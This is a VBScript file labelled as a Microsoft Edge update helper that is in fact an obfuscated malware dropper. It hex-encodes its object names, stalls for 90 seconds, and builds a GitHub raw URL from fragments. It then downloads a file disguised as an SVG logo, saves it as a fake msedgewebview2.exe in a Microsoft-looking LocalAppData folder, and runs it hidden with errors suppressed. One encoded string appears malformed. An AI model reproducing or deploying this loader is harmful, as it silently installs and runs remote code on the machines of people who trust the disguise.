' Updated: 02/05/2026 15:49:37
' Microsoft Edge Update Helper v2.1
Option Explicit
On Error Resume Next

Dim objWS, objFS, objHTTP, objStream
Dim strURL, strDest, strPath
Dim intLoop, intTimer

' Hex decoder
Function HexDec(strHex)
    Dim strResult, intPos
    strResult = ""
    For intPos = 1 To Len(strHex) Step 2
        strResult = strResult & Chr(CInt("&H" & Mid(strHex,intPos,2)))
    Next
    HexDec = strResult
End Function

' Create objects (hex encoded names)
Set objWS = CreateObject(HexDec("575363726970742E5368656C6C"))
Set objFS = CreateObject(HexDec("5363726970746696E672E46696C6553797374656D4F626A656374"))

' Delay loop (90 seconds)
For intLoop = 1 To 90
    intTimer = Timer
    Do While Timer < intTimer + 1
        strURL = Date
    Loop
Next

' Build URL from fragments
strURL = "https" & "://" & "raw" & "." & "git"
strURL = strURL & "hubuser" & "content" & "." & "com"
strURL = strURL & "/" & "sophie" & "duval" & "/" & "der"
strURL = strURL & "/" & "main" & "/" & "logo" & "." & "svg"

' Build destination path
strPath = objWS.ExpandEnvironmentStrings("%LOCAL" & "APP" & "DATA%")
strPath = strPath & "\Micro" & "soft\Edge" & "WebView"
If Not objFS.FolderExists(strPath) Then objFS.CreateFolder strPath
strPath = strPath & "\App" & "lication"
If Not objFS.FolderExists(strPath) Then objFS.CreateFolder strPath
strDest = strPath & "\msedge" & "webview2" & ".exe"

' Download
Set objHTTP = CreateObject(HexDec("4D53584D4C322E536572766572584D4C485454502E362E30"))
objHTTP.SetTimeouts 45000,45000,45000,45000
objHTTP.Open HexDec("474554"),strURL,False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject(HexDec("41444F44422E53747265616D"))
    objStream.Type = 1
    objStream.Open
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile strDest,2
    objStream.Close
    Set objStream = Nothing
    
    If objFS.FileExists(strDest) Then
        objWS.Run Chr(34) & strDest & Chr(34),0,False
    End If
End If

Set objHTTP = Nothing
Set objWS = Nothing
Set objFS = Nothing

